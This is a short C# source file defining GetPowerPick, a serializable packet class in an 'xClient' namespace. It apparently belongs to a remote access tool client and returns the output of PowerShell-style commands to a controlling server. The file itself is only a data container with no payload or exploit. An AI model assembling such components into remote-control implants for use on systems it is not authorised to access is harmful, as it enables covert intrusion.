using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetPowerPick : IPacket
    {
        public string Output { get; set; }

        public bool IsError { get; private set; }



        public GetPowerPick()
        {
        }

        public GetPowerPick(string output, bool isError = false)
        {
            this.Output = output;
            this.IsError = isError;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}